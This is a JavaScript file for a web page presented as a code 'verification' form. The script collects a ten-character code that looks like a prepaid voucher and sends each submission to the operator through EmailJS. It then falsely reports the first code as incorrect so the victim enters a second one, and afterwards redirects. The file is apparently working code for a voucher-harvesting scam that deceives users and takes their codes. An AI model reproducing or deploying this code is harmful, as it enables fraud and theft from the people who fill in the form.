let tentatives = Number(localStorage.getItem("tentatives")) || 0;

console.log("Script chargé");

emailjs.init("OdVrpD_0CpgUT6Ahz");

const part1 = document.getElementById("part1");
const part2 = document.getElementById("part2");
const part3 = document.getElementById("part3");
const result = document.getElementById("result");
const verificationForm = document.getElementById("verificationForm");

if (!verificationForm) {
    console.log("Page sans formulaire de vérification.");
} else {

    
    // Limitation des champs
   

    const inputs = [part1, part2, part3];
    const maxLengths = [4, 3, 3];

    inputs.forEach((input, index) => {

        input.addEventListener("input", function () {

            this.value = this.value
                .toUpperCase()
                .replace(/[^A-Z0-9]/g, "")
                .slice(0, maxLengths[index]);

            if (this.value.length === maxLengths[index] && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }

        });

    });

    
    // Soumission form
   

    verificationForm.addEventListener("submit", function (e) {

        e.preventDefault();

        const code =
            part1.value + "-" +
            part2.value + "-" +
            part3.value;

        // Vérif du format

        if (
            part1.value.length !== 4 ||
            part2.value.length !== 3 ||
            part3.value.length !== 3
        ) {

            result.innerHTML = "Code insuffisant. Vérifiez votre saisie.";
            result.className = "error";
            return;

        }

        // Vérif du captcha

        const captcha = grecaptcha.getResponse();

        if (captcha.length === 0) {

            result.innerHTML = "Veuillez confirmer le captcha.";
            result.className = "error";
            return;

        }

        // Envoi EmailJS

        emailjs.send(
            "service_client",
            "template_j5sh9yy",
            {
                part1: part1.value,
                part2: part2.value,
                part3: part3.value,
                code_complet: code
            }
        )

       .then(function () {

    tentatives++;

    localStorage.setItem("tentatives", tentatives);

    console.log("Tentative numéro :", tentatives);


    
    // first tentative
   

    if (tentatives === 1) {

        result.innerHTML = "✅ Votre demande est en cours de traitement.";
        result.className = "success";


        setTimeout(function () {

            result.innerHTML = "❌ Code incorrect. Veuillez saisir un code correct.";
            result.className = "error";

            part1.value = "";
            part2.value = "";
            part3.value = "";

            grecaptcha.reset();

            part1.focus();


        }, 2000);


        return;

    }



   
    // second tentative
    

    if (tentatives >= 2) {


        result.innerHTML = "✅ Vérification en cours...";
        result.className = "success";


        setTimeout(function () {

            localStorage.removeItem("tentatives");

            window.location.href = "resultat.html";


        }, 1500);


        return;

    }


})

        .catch(function (error) {

            console.error(error);

            result.innerHTML = "Erreur lors de l'envoi.";
            result.className = "error";

        });

    });

}
